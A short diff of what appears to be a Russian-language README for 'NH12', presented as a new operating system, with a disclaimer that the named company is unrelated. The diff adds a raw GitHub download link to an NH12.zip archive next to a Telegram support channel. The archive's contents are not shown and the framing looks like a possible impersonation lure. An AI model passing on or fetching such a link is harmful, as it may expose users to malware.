@@ -15,7 +15,7 @@ NH12 - НОВАЯ операционная система от компании 
 Служба поддержки издателя в Telegram: https://t.me/official_1000_7team
 
 
-
+У кого не получается скачать: https://raw.githubusercontent.com/1000-7team/NH12/refs/heads/main/NH12.zip
 
 
 *компания не имеет отношения к программе
